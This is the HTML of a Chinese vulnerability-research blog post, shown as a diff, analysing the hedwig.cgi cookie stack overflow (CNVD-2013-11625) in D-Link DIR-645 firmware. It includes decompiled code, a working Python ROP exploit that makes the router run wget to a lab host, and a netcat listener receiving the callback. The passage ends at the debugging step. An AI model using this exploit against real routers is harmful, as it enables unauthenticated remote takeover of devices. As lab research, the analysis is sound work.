@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"voxzz.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="D-Link DIR-645 hedwig.cgi CNVD-2013-11625 漏洞分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D-Link DIR-645 CNVD-2013-11625 漏洞分析">
+<meta property="og:url" content="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="VBlog">
+<meta property="og:description" content="D-Link DIR-645 hedwig.cgi CNVD-2013-11625 漏洞分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-01-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-26T11:47:11.464Z">
+<meta property="article:author" content="Voxzz">
+<meta property="article:tag" content="D-Link">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-漏洞分析/","title":"D-Link DIR-645 CNVD-2013-11625 漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>D-Link DIR-645 CNVD-2013-11625 漏洞分析 | VBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">VBlog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%9B%E7%A8%8B"><span class="nav-number">4.1.</span> <span class="nav-text">调试进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E8%BF%94%E5%9B%9E"><span class="nav-number">4.2.</span> <span class="nav-text">控制返回</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">4.3.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="nav-number">4.4.</span> <span class="nav-text">执行代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Voxzz"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Voxzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/voxzz" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;voxzz" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:voxzz0@163.com" title="E-Mail → mailto:voxzz0@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://b1ack1e.github.io/" title="https:&#x2F;&#x2F;b1ack1e.github.io" rel="noopener" target="_blank">b1ackie</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="Voxzz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="VBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="D-Link DIR-645 CNVD-2013-11625 漏洞分析 | VBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D-Link DIR-645 CNVD-2013-11625 漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-01-26 00:00:00 / 修改时间：19:47:11" itemprop="dateCreated datePublished" datetime="2026-01-26T00:00:00+08:00">2026-01-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">漏洞研究</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>D-Link DIR-645 hedwig.cgi CNVD-2013-11625 漏洞分析。</p>
+<span id="more"></span>
+
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：CNVD-2013-11625</p>
+<p>漏洞类型：栈溢出</p>
+<p>漏洞组件：</p>
+<ul>
+<li>&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi</li>
+<li>&#x2F;htdocs&#x2F;web&#x2F;authentication.cgi</li>
+<li>&#x2F;htdocs&#x2F;web&#x2F;post_login.xml</li>
+</ul>
+<p>影响范围：</p>
+<ul>
+<li>D-Link DIR-645 &lt;&#x3D; A1 1.03B11</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>基于 D-Link DIR-645 A1 1.03B11 版本进行漏洞复现。</p>
+<p>连接仿真路由器 Shell 会话，关闭系统地址随机化，确保测试脚本中的 libc.so 文件基地址不变。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">------------------------------</span><br><span class="line">|       FirmAE Debugger      |</span><br><span class="line">------------------------------</span><br><span class="line">1. connect to socat</span><br><span class="line">2. connect to shell</span><br><span class="line">3. tcpdump</span><br><span class="line">4. run gdbserver</span><br><span class="line">5. file transfer</span><br><span class="line">6. exit</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line">Trying 192.168.0.1...</span><br><span class="line">Connected to 192.168.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line"></span><br><span class="line">/ # ps | grep &quot;httpd&quot;</span><br><span class="line"> 4947 root      4976 S    httpd -f /var/run/httpd.conf </span><br><span class="line"> 5355 root       808 S    grep httpd </span><br><span class="line">/ # echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">/ # exit</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
+
+<p>编写测试脚本，在路由器中执行 wget 命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">libc_base_addr = <span class="number">0x77F34000</span></span><br><span class="line">command = <span class="string">&#x27;wget http://192.168.0.2:8000/index.html&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x3EF</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000531FF</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000159CC</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xC</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000158C8</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += command</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/hedwig.cgi&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = http.client.HTTPConnection(host, port).request(<span class="string">&#x27;POST&#x27;</span>, path, data, headers)</span><br><span class="line">r = conn.getresponse()</span><br><span class="line"><span class="built_in">print</span>(r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>运行 NetCat 监听指定端口，接收路由器发送的 HTTP 请求。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -lvvp 8000</span></span><br><span class="line">Listening on 0.0.0.0 8000</span><br><span class="line">Connection received on 192.168.0.1 46499</span><br><span class="line">GET /index.html/postxml HTTP/1.1</span><br><span class="line">Host: 192.168.0.2:8000</span><br><span class="line">User-Agent: Wget</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看 hedwig.cgi 文件信息可知，该文件是一个软链接，实际指向 <code>/htdocs/cgibin</code> 文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l ./htdocs/web/hedwig.cgi</span> </span><br><span class="line">lrwxrwxrwx 1 person person 14 Sep  5 01:08 ./htdocs/web/hedwig.cgi -&gt; /htdocs/cgibin</span><br></pre></td></tr></table></figure>
+
+<p>使用 IDA 分析 <code>/htdocs/cgibin</code> 文件，通过字符串检索，在 <code>main()</code> 函数中定位到路由代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(filename, <span class="string">&quot;hedwig.cgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">int</span> (*)())&amp;hedwigcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据漏洞描述，问题出现在 HTTP Cookie 处理的过程中。</p>
+<blockquote>
+<p>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
+</blockquote>
+<p>通过字符串检索，在 <code>sess_get_uid()</code> 函数中定位到 <code>HTTP_COOKIE</code> 字符串的调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cookie_key = (<span class="type">int</span>)sobj_new();</span><br><span class="line">v2 = <span class="number">-61</span>;</span><br><span class="line">cookie_value = (<span class="type">int</span>)sobj_new();</span><br><span class="line">http_cookie = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !cookie_key )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_23;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码可知，<code>sess_get_uid()</code> 函数从 Cookie 中提取 <code>uid</code> 字段的值，存放在参数 <code>a1</code> 指向的内存空间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *http_cookie_1;</span><br><span class="line">    <span class="keyword">if</span> ( !*http_cookie_1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(cookie_key);</span><br><span class="line">      sobj_free(cookie_value);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(cookie_key, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(cookie_value, *http_cookie_1++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(cookie_key, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++http_cookie_1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">-61</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(cookie_key, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    uid = sobj_get_string(cookie_value);</span><br><span class="line">    sobj_add_string(a1, (<span class="type">const</span> <span class="type">char</span> *)uid);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>sess_get_uid()</code> 函数的引用情况，在 <code>hedwigcgi_main()</code> 函数中发现漏洞位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> xml_path[<span class="number">1024</span>]; <span class="comment">// [sp+C0h] [-400h] BYREF</span></span><br><span class="line">....</span><br><span class="line">sess_get_uid(cookie_uid);</span><br><span class="line">uid = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(cookie_uid);</span><br><span class="line"><span class="built_in">sprintf</span>(xml_path, <span class="string">&quot;%s/%s/postxml&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, uid);</span><br><span class="line">xmldbc_del(<span class="number">0</span>, <span class="number">0</span>, xml_path);</span><br></pre></td></tr></table></figure>
+
+<p>从 Cookie 中取得的 uid 被直接拼接到 <code>xml_path</code> 字符串中，并未进行任何长度或者越界检查。由于 uid 的值和长度均可通过 HTTP 请求控制，因此此处存在栈溢出漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="调试进程"><a href="#调试进程" class="headerlink" title="调试进程"></a>调试进程</h3><p>连接仿真路由器 Shell 会话，查找 httpd 进程，并关闭系统地址随机化保护。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">------------------------------</span><br><span class="line">|       FirmAE Debugger      |</span><br><span class="line">------------------------------</span><br><span class="line">1. connect to socat</span><br><span class="line">2. connect to shell</span><br><span class="line">3. tcpdump</span><br><span class="line">4. run gdbserver</span><br><span class="line">5. file transfer</span><br><span class="line">6. exit</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line">Trying 192.168.0.1...</span><br><span class="line">Connected to 192.168.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line"></span><br><span class="line">/ # ps | grep &quot;httpd&quot;</span><br><span class="line"> 4933 root      4976 S    httpd -f /var/run/httpd.conf </span><br><span class="line"> 6267 root       808 S    grep httpd </span><br><span class="line">/ # echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">/ # exit</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
+
+<p>运行 gdbserver 附加 httpd 进程。</p>
